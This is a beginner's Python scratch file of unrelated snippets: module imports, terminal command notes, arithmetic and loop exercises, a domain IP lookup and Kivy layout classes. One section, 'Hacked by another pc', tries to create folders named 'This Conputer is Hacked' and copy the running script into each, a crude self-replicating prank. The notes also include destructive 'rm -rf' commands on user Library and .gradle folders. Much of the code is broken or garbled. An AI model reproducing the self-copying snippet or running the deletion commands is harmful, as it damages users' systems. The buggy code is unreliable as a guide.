# impurt moduiels
from distutils.cmd import Command
from graphics import *
import pyfiglet 
import termcolor 
import random
import socket 
import ast 
import itertools # count
import sys # argv
import os
import keyword
import socket 
import turtle
import tkinter 
import graphics
import sketchpy 
from PIL import ImageTk
import html
import pyautogui
import imp
import cv2
import mediapipe 
import kivy
import kivymd
import buildozer
import rotatescreen



import ursina
import pyttsx3
import PyPDF2
import freegames
import gooeypie
import PySimpleGUI
import PySimpleGUIQt
import PySimpleGUIWx



# sudo apt-get update
# pip list -o
# pip freeze
# python3 -m freegames list




#from win32gui import *
#from win32ui import *
#from win32api import *






# python any modules install Command
# pip install <modules name>



# pwd = (corrent folder)

# ls = (folder list)

# cd = (change folder)

# cd .. = (back current folder)

# mkdir = make folder (new folder)

# touch = make file (main.py file)

# rmdir = delete folder (Empty)

# rm -rf delete folder (Force Delete)

# rm = delete file (main.py record.py)

# open main.py (open another)

# clear (Clear all code on the Terminal)

# date (current date nad time)

# cal (Full calender show)

# nano (shortcut help show)

# uptime (MacBook use time)

# hiatory (terminal use history)


# Uninstall Android Studio
# Delete application
# rm -rf /Application/Android\studio.app

# Delete android studio plist file
# rm -rf ~/Library/Preferences/com.google.android*

# Delete the android emulators plist file
# rm -rf ~/Library/Preferences/com.android*

# Delete main plugins
# rm -rf ~/Library/Application/Support\Google\AddroidStudio

# Deletes all loges that andeoid studil outputs 
# rm -rf ~/Library/Logs/Google/AndroidStudio*

# Delete android studeos caches
# rm -rf ~/Library/Caches/Google/AndroidStudio*

# Delete android SDK tools
# rm -rf ~/Library/Android*

# Delete gradle files
# rm -rf ~/.gradle




from cgitb import text
from re import T
import kivy.app
from kivy.metrics import dp
from kivy.properties import StringProperty, BooleanProperty
from kivy.app import App
from kivy.uix.widget import Widget
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.anchorlayout import AnchorLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.stacklayout import StackLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.pagelayout import PageLayout
from kivy.uix.button import Button





# Multiple print single line
print("Asad, Asif, Rakib< Roki, Helal, Jamal, ",end="")
print("Asad, Asif, Rakib< Roki, Helal")

# Name title figlet one system
from termcolor import colored
from pyfiglet import figlet_format

message = input("The message : ")
color = input("The colors : ")

bannre_art = figlet_format(message)
final = colored(bannre_art, color)
print(final)

# Name title figlet two system
bannre = figlet_format("Python Code")
fl = colored(bannre,"blue")
print(fl)


# fungsion use
Frist = int(input("Frist number : "))
Second = int(input("Second number : "))

def adding(Frist,Second):
    sum=Frist+Second
    print("the sum number is {}".format(sum))

adding(Frist,Second)


# Formating 
a = input("Enter your name : ")
b = input("Enter your age : ")
c = input("Enter your result : ")

print("Name : {}\nAge : {}\nResult : {}".format(a,b,c))


#input string
from random import randint
from xml.dom.minidom import CharacterData


#chect CharacterData
while 1:
    ch = (input ("Enter charector : "))
    if ch == 'a' or ch == 'e' or ch == 'i' or ch == 'o' or ch == 'u':
     print("Vowel")
     break
    else:
        print("Consonant")



#maximum data
i = 1
while i < 100:
    print(i)
    i = i+100
print(i)


n = int (input("Number : "))
sum = 2
i = 5
while i <= n :
    #sum = sum + 5
    i = i + 1
    print(i)

q = int(input("Number : "))
print(q)


#Gun fol number
a = int(input("First No : "))
b = int(input("Second No : "))
ent = a*b
print(ent)


#Defarant of number and run
number = list(range(2,101,2))
print(number)



#sob songkhar jog fol
Number = [10,20,30,40,50,100]
sum = 0
for x in Number:
    sum = sum + x
    print(sum)
print(sum)



#1+2+3+.......n
n = int (input("Enter number : "))
sum = 0

for x in range(1,n+1,2):
    sum = sum + x
print(sum)


# Multiple line Star print 
n = 10
for i in range(n+1):
    print((2*i-1)*"*")


#Random number genarate and multiple guess
for x in range(1,3):
    gsNumber = int(input("Enter Random Number : "))
    randomNumber = randint(1,3)

    if gsNumber == randomNumber:
        print("Congratulations!")
    else:
        print("Sorry, You have lost. Random Number is : ", randomNumber)



numberOfWords = 0
numberOfLetters = 0
numberOfDigits = 0

test = input("Enter : ")

for x in test:
    x - x.lower()

    if x >= '0' and x <= '9':
            numberOfDigits = numberOfDigits + 1 

    elif x >= ' ' and x <= ' ':
        numberOfWords = numberOfWords + 1 

    elif x >= 'A' and x <= 'Z':
        numberOfLetters = numberOfLetters + 1    

    print(numberOfWords)
    print(numberOfDigits)
    print(numberOfLetters)




num = input("Enter : ")
studentId = {
    101 : "Md Rasel",
    102 : "Md Razzak",
    103 : "Md Limon",
    104 : "Md Asif",
}

print(studentId.get(num, "invaled numbers"))

number_1 = {1,2,3,4,5}
number_2 = set([4,5,6,7])
number_2.add(8)
number_2.remove(8)
print(8 not in number_2)

def add (x,y):
    sum = x + y
    print(sum)

add(15,25)
add(40,10)
add(70,258)
add(102,90)
add(150,20)






# Multiple number print 
for i in range (10):
    print("Hello world")














# user list        
user = ["Asad", "Rakib", "Rubel", "Ratul", "Hafij", "Liton"]

for name in user:
    print(name)



# user two list    
users = {"Asad": 50, "Rakib": 56, "Rubel": 85, "Ratul": 33, "Hafij": 45, "Liton": 41}

for key,value in users.items():
    print(f"the marks of {key} is {value}")

    
# fangsion use
def markSit():
    users1 = {"Asad": 50, "Rakib": 56, "Rubel": 85, "Ratul": 33, "Hafij": 45, "Liton": 41}

    for key,value in users1.items():
        print(f"the marks of {key} is {value}")
markSit()



# input data formating
name = input("Enter your name : ")
age = int(input("Enter your age : "))

print("My name is {} and I am {} year old.".format(name, age))



# Code porichiti
data = [1, 2, 3, 4, 5, 6] # change List
data = [1, 2, 3, 4, 5, 6] # not change Tuple
value = (1, 2, 3, 4, 5, 6)

print(type(data))
print(type(value))




# search ip address on domain

import socket 
domain_name = input("Enter terget domain : ")

terget_ip = socket.gethostbyname(domain_name)
print("IP For {} : {}".format(domain_name,terget_ip))


# Hacked by another pc

from ast import main
from itertools import count
from sys import argv
import os
folder_name = "This Conputer is Hacked"
count = 0
script = argv
main_file_name = str(script[0])

while count <100:
    count += 1
    try:
        temp = folder_name(count)
        os.mkdir(temp)
        os.system(r"cpoy"+main_file_name +"{0}".format(temp))
    except Exception as Error:
        print(Error)
        count += 10

# While loop 
i = 1 
while i <= 10:
    print("ok")
    i += 1


# not know
import pyfiglet

import termcolor

mas = pyfiglet.figlet_format("What is")

color = termcolor.colored("red")

ascii_art = (mas)
colored_ascii = (ascii_art, color)
print(colored_ascii)





































from graphics import *
def main():
    win = GraphWin("My Window", 500, 500)
    win.setBackground(color_rgb(0, 0, 0))
    pt = Point(250, 250)
    cir = Circle(pt, 50)
    cir.setFill(color_rgb(100, 255, 50))
    cir.draw(win)
    win.getMouse()
    win.close()
main()


# Or

def line(x1, y1, x2, y2):
    return Line(Point(250, 250), Point(250, 250))

def main():
    win = GraphWin("My Window", 500, 500)
    win.setBackground(color_rgb(0, 0, 0))

    ln = Line(Point(250, 250), Point(250, 250))
    ln.setOutline(color_rgb(0, 255, 255))
    ln.draw(win)
   
    win.getMouse()
    win.close()
main()









from cgitb import text
from re import T
import kivy.app
from kivy.metrics import dp
from kivy.properties import StringProperty, BooleanProperty
from kivy.app import App
from kivy.uix.widget import Widget
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.anchorlayout import AnchorLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.stacklayout import StackLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.pagelayout import PageLayout
from kivy.uix.button import Button

# BoxLayout .py
class BoxLayoutExemple(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = "vertical"
        b1 = Button(text="A")
        b2 = Button(text="B")
        b3 = Button(text="C")
        self.add_widget(b1)
        self.add_widget(b2)
        self.add_widget(b3)

class WidgetsExample(GridLayout):
    count = 1
    count_eneble = BooleanProperty(False)
    my_text = StringProperty("1")
    text_input_str = StringProperty("")
    # slider_value_text = StringProperty("Value")

    def on_button_click(self):
        print("Button click")
        if self.count_eneble:   
            self.count += 1
            self.my_text = str(self.count)

    def on_taggleButton_state(self, widget):
        print("toggles state: " + widget.state)
        if widget.state == "normal":
            widget.text = "Off"
            self.count_eneble = False
        else:
            widget.text = "On"
            self.count_eneble = True


    def on_switch_active(self, widget):
        print("Switch: " + str(widget.active))

    #def on_slider_value(self, widget):
       # print("Slider: " + str(int(widget.value)))
        # self.slider_value_text = str(int(widget.value))

    def on_text_validate(self, widget):
        self.text_input_str = widget.text
        

        

class StackLayoutExample(StackLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        # self.orientation = "rl-bt"
        for i in range(0,100):
            #size = dp(100) + i*10
            size = dp(100)
            b = Button(text=str(i+1), size_hint=(None, None),size=(size, size))
            self.add_widget(b)






#class WidgetsExample(GridLayout):
#    pass


class AnchorLayoutExample(AnchorLayout):
    pass

class BoxLayoutExanple(BoxLayout):
   """ def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = "vertical"
        b1 = Button(text="A")
        b2 = Button(text="B")
        b3 = Button(text="C")
        self.add_widget(b1)
        self.add_widget(b2)
        self.add_widget(b3) """


class MainWidget(Widget):
    pass

class TheLab(App):
    pass



class CanvasExample1(Widget):
    pass

class CanvasExample2(Widget):
    pass

class CanvasExample3(Widget):
    pass



TheLab().run()